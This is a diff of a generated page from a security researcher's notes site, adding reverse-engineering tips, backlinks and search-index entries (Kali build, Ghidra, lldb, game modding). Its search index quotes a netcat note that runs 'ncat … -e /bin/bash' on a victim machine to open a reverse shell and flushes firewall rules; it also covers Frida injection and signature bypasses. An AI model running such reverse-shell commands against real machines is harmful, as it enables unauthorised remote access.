@@ -98,7 +98,7 @@ body {
         </a>
 
         <div id="head">
-            <h1 class="menu-item menu-item-position"><a class="author" href="../"></a></h1> / 
+            <h1 class="menu-item menu-item-position"><a class="author" href="../">duraki&#39;s notes</a></h1> / 
             <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/about.html">halis duraki</a></h1> /
             <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/reports.html">security rep+</a></h1> / 
             <h1 class="menu-item menu-item-position"><a class="author" href="https://duraki.github.io/consulting/">consulting</a></h1> / 
@@ -119,7 +119,18 @@ body {
         <h1>Pure Reverse Engineering</h1>
         <p>Some internal <a href="../reverse-engineering-tricks-and-tips">knowledge</a> have been shared here. Otherwise, check references below.</p>
 <p>Use <a href="../byteman">Byteman</a> to instrument compiled Java application and Jar based files. A <a href="../byteman-scripts">sample script</a> has been included in the notes.</p>
-<p><strong>References</strong></p>
+<h3 id="hopper-disassembler">Hopper Disassembler</h3>
+<p>In case Hopper Disas is &ldquo;Not Responding&rdquo; due to large binary loaded you can:</p>
+<ul>
+<li>Wait a bit more, close all unused apps, especially (Chrome) tabs</li>
+<li>Open Activity Monitor and check Hopper process details</li>
+<li>If nothing works, use the command below to purge all unused virtual memory</li>
+</ul>
+<pre tabindex="0"><code>% purge
+
+# =&gt; ... wait a bit
+# =&gt;     hopper disas. should be unfrezzed and responding
+</code></pre><p><strong>References</strong></p>
 <ul>
 <li><a href="https://kov4l3nko.github.io/blog/2016-04-27-debugging-ios-binaries-with-lldb/">Debugging iOS binaries with lldb</a></li>
 <li><a href="https://github.com/horangi-cyops/flutter-ssl-pinning-bypass">Bypass Flutter SSL Pinning (2021)</a></li>
@@ -132,6 +143,18 @@ body {
 
 
    
+      
+   
+
+   
+
+   
+
+   
+
+   
+
+   
 
    
 
@@ -229,6 +252,14 @@ body {
 
    
 
+   
+
+   
+
+   
+
+   
+      
    
 
    
@@ -269,6 +300,13 @@ body {
     <h4>Links to this note</h4>
     <div class="backlinks">
       
+        <a href="../" class="backlink-anchor">
+          <div class="backlink">
+            <p class="backlink-title">Index</p>
+            <p class="backlink-preview">* [Pure Reverse Engineering](/pure-reverse-engineering)  </p>
+          </div>
+        </a>
+      
         <a href="../ios-reverse-engineering/" class="backlink-anchor">
           <div class="backlink">
             <p class="backlink-title">iOS Reverse Engineering</p>
@@ -280,6 +318,13 @@ body {
           <div class="backlink">
             <p class="backlink-title">List of Topics</p>
             <p class="backlink-preview">* [Pure Reverse Engineering](/pure-reverse-engineering)  </p>
+          </div>
+        </a>
+      
+        <a href="../re/" class="backlink-anchor">
+          <div class="backlink">
+            <p class="backlink-title">RE</p>
+            <p class="backlink-preview">* [Pure Reverse Engineering](./pure-reverse-engineering)  </p>
           </div>
         </a>
       
@@ -305,7 +350,7 @@ window.store = {
         
         "title": "Index",
         "tags": [],
-        "content": "Hello, these are my personal notes and knowledge graph. I started using Obsidian a bit early in 2020. and continued graphing my knowledge from there.\nI wanted something more towards functional, as to offer me a practical snippet library for my TTP\u0026rsquo;s, both online and as a backup of dementia.\nThe notes are largery inspired by others and especial Andy\u0026rsquo;s note-taking samples on his site. Thanks to Justin and Jethro for their theme support on static generation for this library of mine. Hope it will be worth to you as well as me.\nYou can start exploring from the List of Topics, List of Tools, or see the full list of notes.\n title: \u0026ldquo;List of Topics\u0026rdquo; Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes How to write Notes Troubleshoot ~ ideas   How it works Additionalities offered through [params.styles] via config.toml. It\u0026rsquo;s possible to deploy dark version as well. Read for more in *.css.\n  This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience.  ", 
+        "content": "Hello, these are my personal notes and knowledge graph. I started using Obsidian a bit early in 2020. and continued graphing my knowledge from there.\nI wanted something more towards functional, as to offer me a practical snippet library for my TTP\u0026rsquo;s, both online and as a backup of dementia.\nThe notes are largery inspired by others and especial Andy\u0026rsquo;s note-taking samples on his site. Thanks to Justin and Jethro for their theme support on static generation for this library of mine. Hope it will be worth to you as well as me.\nYou can start exploring from the List of Topics, List of Tools, or see the full list of notes.\n List of Topics Automotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes Building Kali Linux for Banana Pro 🎱 Uplink (game) Modding How to write Notes Troubleshoot ~ ideas   How it works Additionalities offered through [params.styles] via config.toml. It\u0026rsquo;s possible to deploy dark version as well. Read for more in *.css.\n  This website is provided for free educational purposes. Knowledge shared here can be used for personal gain and experience.  ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/"
     },
     
@@ -361,6 +406,16 @@ window.store = {
     
     
     
+    "https:\/\/duraki.github.io\/notes\/public\/automotive\/": {
+        
+        "title": "Automotive",
+        "tags": [],
+        "content": " Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/automotive\/"
+    },
+    
+    
+    
     "https:\/\/duraki.github.io\/notes\/public\/automotive-cybersecurity-videos\/": {
         
         "title": "Automotive Cybersecurity Videos",
@@ -397,6 +452,16 @@ window.store = {
         "tags": [],
         "content": "The blog is using a custom site generator called art and it uses Ruby and some wrapper magic to generate this from a rather minimal configuration setup in .home.yml file.\n--- minimal: artist: \u0026#34;Your Name\u0026#34; title: \u0026#34;Blog Title\u0026#34; description: \u0026#34;Blog description.\u0026#34; theme: \u0026#34;theme-name\u0026#34; posts: in: /posts/in # =\u0026gt; post in (md) out: /posts/out # =\u0026gt; post out (html) scripts: - \u0026#34;my super href:/about/me.html\u0026#34; # =\u0026gt; Links/URIs/Other art: ga: UA-00000000-X # =\u0026gt; your Google Analytics ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/blog-setup\/"
+    },
+    
+    
+    
+    "https:\/\/duraki.github.io\/notes\/public\/building-kali-linux-for-banana-pro\/": {
+        
+        "title": "Building Kali Linux for Banana Pro",
+        "tags": [],
+        "content": "Equipment  MacOS with GNU/Linux Virtual Machine or GNU/Linux equivalent LeMaker Banana Pro arm_pc SDCard with at least 16GB capacity (preferably \u0026ldquo;Class 10\u0026rdquo; or higher)  Build Instructions The Banana Pro has a dual core 1GHz Cortex™-A7 processor with a Mali400MP2 GPU and 1GB DDR3 RAM. Kali Linux can run from an external microSD card.\nKali Linux is supporting Banana Pro but it must be built from source. You will obviously need a GNU/Linux based OS (preferably Kali Linux) \u0026ndash; although I personally use VMWare Workstation with Ubuntu 20.04. I\u0026rsquo;d advice you to mkswap of at least 8GB space, and extend your drive to min. 120GB. The build instructions are summarised below, with Banana Pro build script described here:\n$ cd ~/ $ git clone https://gitlab.com/kalilinux/build-scripts/kali-arm $ cd ~/kali-arm/ $ sudo ./common.d/build_deps.sh # will take some time # =\u0026gt; i\u0026#39;m a fan of Mate DE $ sudo ./banana-pro.sh --desktop mate Compilation info Hardware model: Banana Pro (32-bit) Architecture: armhf OS build: kali-rolling 2022.2 Desktop manager: mate ... The generated image will be deployed in the ./images directory with the *.img.xz.\nPost-Build Instructions After successfully building a Kali Linux image for Banana Pro, via the process explained above, you can now proceed to deploy the final arm image by any route of your interest.\nTherefore, if you want to use dd \u0026ndash; via GNU/Linux or MacOS:\nxzcat images/kali-linux-2022.2-banana-pro-xfce-armhf.img.xz | sudo dd of=/dev/sdb bs=4M status=progres\nOr, if you are like me \u0026ndash; favoring BalenaEtcher which automatically fixes BOOT disk partitions:\n Pick an Image -\u0026gt; Select SD Card -\u0026gt; Etch!\n Running Your Banana Pro might need a first-setup hardware equipment (display, mouse \u0026amp; kb).\nPreflight Configuration:\nI usually deploy the following config once I\u0026rsquo;m logged in Kali:\n# =\u0026gt; ssh kali@x.x.x.x $ touch .hushlogin # =\u0026gt; remove welcome message $ echo $PS1 # =\u0026gt; (in .bashrc): PS1=\u0026#34;@\\h [\\s] \\w \u0026#34; \u0026#34;@\\h [\\s] \\w \u0026#34; @ kali [-bash] ~ # =\u0026gt; clean term prompt Enabling root account:\nkali@kali:~$ sudo passwd [sudo] password for kali: Enabling root for SSH:\nkali@kali:~$ grep PermitRootLogin /etc/ssh/sshd_config #PermitRootLogin prohibit-password # the setting of \u0026#34;PermitRootLogin without-password\u0026#34;. kali@kali:~$ kali@kali:~$ man sshd_config | grep -C 1 prohibit-password PermitRootLogin Specifies whether root can log in using ssh(1). The argument must be yes, prohibit-password, forced-commands-only, or no. The default is prohibit-password. If this option is set to prohibit-password (or its deprecated alias, without-password), password and keyboard-interactive authentication are disabled for root. kali@kali:~$ kali@kali:~$ sudo systemctl restart ssh Upgrading \u0026amp; Updating the box\nkali@kali:~$ sudo apt update kali@kali:~$ sudo apt full-upgrade -y kali@kali:~$ sudo apt install -y kali-linux-default Other metapacakages: System Packages, DE\u0026rsquo;s, Tools Package, Menu Package\nAdditional info is available on Kali.org website, which includes Kali In The Browser (noVNC), Kali In The Browser (Guacamole).\n", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/building-kali-linux-for-banana-pro\/"
     },
     
     
@@ -461,6 +526,16 @@ window.store = {
     
     
     
+    "https:\/\/duraki.github.io\/notes\/public\/classical\/": {
+        
+        "title": "Classical",
+        "tags": [],
+        "content": " OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse  ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/classical\/"
+    },
+    
+    
+    
     "https:\/\/duraki.github.io\/notes\/public\/classical-api-abuse\/": {
         
         "title": "Classical API Abuse",
@@ -497,6 +572,16 @@ window.store = {
         "tags": [],
         "content": "Requires iproxy and frida-ios-dump. File will be generated in current directory with *.ipa extension.\n# =\u0026gt; Start iproxy $ iproxy 2222 22 # =\u0026gt; Lists App from iOS processes $ cd ~/util/re/ios/frida-ios-dump $ python dump.py -l PID Name Identifier --- - App Name Here xxx.xxxxxx.xxxxxx.xx # =\u0026gt; Dump App from iOS device $ ./dump.py xxx.xxxxxx.xxxxxx.xx ... ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/decrypt-ipa-from-appstore\/"
+    },
+    
+    
+    
+    "https:\/\/duraki.github.io\/notes\/public\/dev\/": {
+        
+        "title": "Dev",
+        "tags": [],
+        "content": " Bash  ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/dev\/"
     },
     
     
@@ -557,6 +642,16 @@ window.store = {
         "tags": [],
         "content": "This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.\nFirst decompile the APK and check the AndroidManifest.xml file.\n$ more AndroidManifest.xml \u0026lt;application ...\u0026gt; \u0026lt;activity android:name=\u0026#34;xxx.activity.SplashActivity\u0026#34; android:noHistory=\u0026#34;true\u0026#34; android:screenOrientation=\u0026#34;portrait\u0026#34;\u0026gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor \u0026lt;init\u0026gt;(V) to include frida-gadget.\n$ vim xxx.activity.SplashActivity .class public Lcom/xxx/activity/SplashActivity; .source \u0026#34;SourceFile\u0026#34; # direct methods .method public constructor \u0026lt;init\u0026gt;()V .locals 0 .line 8 invoke-direct {p0}, Lcom/halcom/mobile/hybrid/activity/SplashActivity;-\u0026gt;\u0026lt;init\u0026gt;()V # =\u0026gt; injection point const-string v0, \u0026#34;frida-gadget\u0026#34; invoke-static {v0}, Ljava/lang/System;-\u0026gt;loadLibrary(Ljava/lang/String;)V return-void .end method Remember to inject this code in all of your public constructor \u0026lt;init\u0026gt;()V in Splash* activities. Move the application to your device and start it. Application has to handle libfrida-gadget.so correctly and load it at runtime. In Frida, it\u0026rsquo;s enought to type %resume in Frida REPL to continue execution after the injection.\n", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/frida-gadget-injection\/"
+    },
+    
+    
+    
+    "https:\/\/duraki.github.io\/notes\/public\/ghidra-and-related\/": {
+        
+        "title": "Ghidra and related",
+        "tags": [],
+        "content": "Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -\u0026gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.\nOnce the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager if you like but the scripts also have menus and keyboard shortcuts for ease of use. In order to activate the menus and shortcuts you must click the In Tool checkbox next to the scripts you wish to integrate into the tool.\nFavorite Plugins  coloring_call_jmp.py py-findcrypt-ghidra binwalk.py yara.py swift_demangler.py golang_renamer.py ghidra-fidb-repo replace-constants annotate-syscalls goto-main operator analyzeocmsgsend.py fox rhabdomancer.java  Additionally, there is ghidra-snippets repository that may be usable as a reference to various Ghidra functions and their signatures.\n", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/ghidra-and-related\/"
     },
     
     
@@ -635,7 +730,7 @@ window.store = {
         
         "title": "List of Topics",
         "tags": [],
-        "content": "Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes How to write Notes Troubleshoot ~ ideas  ", 
+        "content": "Personal list of topics of interest. At least for me eh? :)\nAutomotive Cyber Security §Automotive  Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment  Classical Penetration Testing §Classical Pentest  OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists  REST API Issue Library Web Issue Library PHP Source Code Analysis  PHP Filesystem Functions     Networking §Network  Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks    Reverse Engineering §RE  Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research  Development §dev blog\nMockup for my minimal blog and notes publishing app called art (visible in blog setup).\n todo: vim.init, tmux, iterm, osx todo: gmmk + key remap todo: photos/ physical Bash  Misc  Windows Notes Linux Notes MacOS Notes Building Kali Linux for Banana Pro 🎱 Uplink (game) Modding How to write Notes Troubleshoot ~ ideas  ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/list-of-topics\/"
     },
     
@@ -645,7 +740,7 @@ window.store = {
         
         "title": "lldb",
         "tags": [],
-        "content": "Attach Failed Not allowed to attach to process:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:\n$ cat /tmp/debug_entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security-get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.cs.disable-library-validation\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.device.audio-input\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ codesign --force --options runtime --sign - --entitlements /tmp/debug_entitlements.plist /Apps/MyApp.app Terminated due to code signing error Happens when codesign is not put in place. Need to codesign a Macho binary:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) Process 8873 exited with status = 9 (0x00000009) Terminated due to code signing error Solution:\n# =\u0026gt; Create a new Code Signing certificate in Keychain Access, then ... $ codesign --deep --force -s \u0026#34;signature\u0026#34; /Apps/MyApp.app ", 
+        "content": "Cheatsheet Objective-C Important \u0026ndash; set a lldb language context to Objective-C:\n(lldb) settings set target.language objc Cast an address to object:\n(lldb) po ((MKPinAnnotationView *)0x7df67c50).alpha \u0026hellip;\nSwift Important \u0026ndash; set a lldb language context to Swift:\n(lldb) settings set target.language swift Import a Library in the lldb context:\n# =\u0026gt; Library expr -l Swift -- import UIKit # =\u0026gt; Custom Classes expr -l Swift -- import MyTestProject expr -l Swift -- let $vc = unsafeBitCast(0x7fad22c066d0, ViewController.self) expr -l Swift -- print($vc.view) Create a new class from lldb:\nexpression let $myHello = HelloClass() po $myHello Call a method from a class:\npo $myHello.hello() Get an object address of current instance:\n(lldb) p tabView.controlTint (NSControlTint) $R10 = defaultControlTint (lldb) p self (LearningStoryboard.NSTabViewController) $R11 = 0x00006080000e2280 { # =\u0026gt; then cast this address to x object. @see below. Cast an address to object:\n(lldb) e let $pin = unsafeBitCast(0x7df67c50, MKPinAnnotationView.self) (lldb) po $pin # =\u0026gt; then you can work with $pin as usual – access properties, call methods, etc. Multiplatform (ObjC + Swift) If you want to run an lldb expression depending on the scope, use:\nexpression -l objc -o -- HelloClass* class = [[HelloClass alloc] init] # =\u0026gt; obj-c expression -l swift -o -- let $myHello = HelloClass() # =\u0026gt; swift lldb Errors and Workarounds Attach Failed Not allowed to attach to process:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) error: attach failed: attach failed (Not allowed to attach to process. Look in the console messages (Console.app), near the debugserver entries, when the attach failed. The subsystem that denied the attach permission will likely have logged an informative message about why it was denied.) Solution:\n$ cat /tmp/debug_entitlements.plist \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;com.apple.security-get-task-allow\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.cs.disable-library-validation\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;com.apple.security.device.audio-input\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; $ codesign --force --options runtime --sign - --entitlements /tmp/debug_entitlements.plist /Apps/MyApp.app Terminated due to code signing error Happens when codesign is not put in place. Need to codesign a Macho binary:\n(lldb) process attach --pid 76371 (# =\u0026gt; or by Name) Process 8873 exited with status = 9 (0x00000009) Terminated due to code signing error Solution:\n# =\u0026gt; Create a new Code Signing certificate in Keychain Access, then ... $ codesign --deep --force -s \u0026#34;signature\u0026#34; /Apps/MyApp.app ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/lldb\/"
     },
     
@@ -681,12 +776,32 @@ window.store = {
     
     
     
+    "https:\/\/duraki.github.io\/notes\/public\/modding-uplink-by-introversion\/": {
+        
+        "title": "Modding Uplink by Introversion",
+        "tags": [],
+        "content": "Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.\nChanging the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read. You can change this behaviour by patching address:\n00000001000cdd28 mov ecx, 0xa ; argument #4 for method sub_1000a2da0 What this does is replace the default Uplink UI font size from 9 to 10, making it appear larger on the screen and more easier to read. Looking at the source code, the following item is present:\n// taken from: uplink/src/uplink.cpp void Init_Fonts\t() { ... success = (GciLoadTrueTypeFont ( HELVETICA_10, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 9 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_12, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 11 ) \u0026amp; GciLoadTrueTypeFont ( HELVETICA_18, \u0026#34;Dungeon\u0026#34;, dungeonFontFilename, 16 )); The above fixes the first call of GciLoadTrueTypeFont() function, and changing the default mov ecx, 0x9 to mov ecx, 0xa (10). Produce a new binary and run it from MacOS application directory. Voi-la! 🎉\nReferences: uplink/src/uplink.cpp\nDefinitions Some interesting definitions have been identified.\nGame World and Mapped Data\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.h` #define\tWORLD_START_DATE\t0, 0, 0, 24, 2, 2010\t#define\tGAME_START_DATE\t0, 0, 0, 24, 3, 2010\t// ;) #define\tPLAYER_START_BALANCE\t3000 #define\tPLAYER_START_GATEWAYNAME\t\u0026#34;Gateway ALPHA \u0026#34; #define\tPLAYER_START_CPUTYPE\t\u0026#34;CPU ( 60 Ghz )\u0026#34; #define\tPLAYER_START_MODEMSPEED\t1 #define\tPLAYER_START_MEMORYSIZE\t24 // also see #define\tIP_LOCALHOST\t\u0026#34;127.0.0.1\u0026#34; // also see #define\tTICKSREQUIRED_* #define\tTRACESPEED_* #define\tHACKDIFFICULTY_* #define\tPROB_MISSION_* #define\tPAYMENT_* #define MINDIFFICULTY_* #define TIME_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* #define MINDIFFICULTY_* Global App Defines\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/app/globals_defines.h` #define\tALPHA\t0.85f\t// Alpha value used for interface #define\tALPHA_DISABLED\t0.5\t// Alpha value for disabled buttons //#define\tCHEATMODES_ENABLED\t// Eg all-links, all-software, password-bypass etc Game Data, Titles, World Map Gateways, SW/HW Upgrades\nTaken from: `https://github.com/gene9/uplink-source-code/blob/master/uplink/src/game/data/data.cpp` UPLINKRATING [] NEUROMANCERRATING [] PHYSICALGATEWAYLOCATIONS [] SOFTWARE_UPGRADES [] ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/modding-uplink-by-introversion\/"
+    },
+    
+    
+    
     "https:\/\/duraki.github.io\/notes\/public\/netcat-tricks\/": {
         
         "title": "netcat tricks",
         "tags": [],
         "content": "Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|victim machine| On \u0026ldquo;attackers machine\u0026rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:\n$ sudo iptables -F $ sudo ncat -nlvp 9999 On \u0026ldquo;victim machine\u0026rdquo; (target), connect to netcat listener:\n$ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.\nFor probe direct reverse shell:\n|attacker machine|\u0026lt;------\u0026gt;|attacker box|\u0026lt;-------\u0026gt;|victime machine| On \u0026ldquo;attackers box\u0026rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.\n$ sudo iptables -F # =\u0026gt; important! $ sudo ncat --broker 9999 # =\u0026gt; creates a broker for probing On \u0026ldquo;attackers machine\u0026rdquo; (see above):\n$ sudo ncat [attacker box] 9999 On \u0026ldquo;victim machine\u0026rdquo;:\n$ sudo ncat ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/netcat-tricks\/"
+    },
+    
+    
+    
+    "https:\/\/duraki.github.io\/notes\/public\/network\/": {
+        
+        "title": "Network",
+        "tags": [],
+        "content": " Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks  ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/network\/"
     },
     
     
@@ -775,8 +890,18 @@ window.store = {
         
         "title": "Pure Reverse Engineering",
         "tags": [],
-        "content": "Some internal knowledge have been shared here. Otherwise, check references below.\nUse Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.\nReferences\n Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  ", 
+        "content": "Some internal knowledge have been shared here. Otherwise, check references below.\nUse Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.\nHopper Disassembler In case Hopper Disas is \u0026ldquo;Not Responding\u0026rdquo; due to large binary loaded you can:\n Wait a bit more, close all unused apps, especially (Chrome) tabs Open Activity Monitor and check Hopper process details If nothing works, use the command below to purge all unused virtual memory  % purge # =\u0026gt; ... wait a bit # =\u0026gt; hopper disas. should be unfrezzed and responding References\n Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  ", 
         "url": "https:\/\/duraki.github.io\/notes\/public\/pure-reverse-engineering\/"
+    },
+    
+    
+    
+    "https:\/\/duraki.github.io\/notes\/public\/re\/": {
+        
+        "title": "RE",
+        "tags": [],
+        "content": " Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering  Ghidra and Related LLDB for MacOS Hopper for MacOS   iOS Reverse Engineering  Frida \u0026amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis   Android Reverse Engineering  Frida \u0026amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation   OPCRouter Research [wip]  ", 
+        "url": "https:\/\/duraki.github.io\/notes\/public\/re\/"
     },
     
     
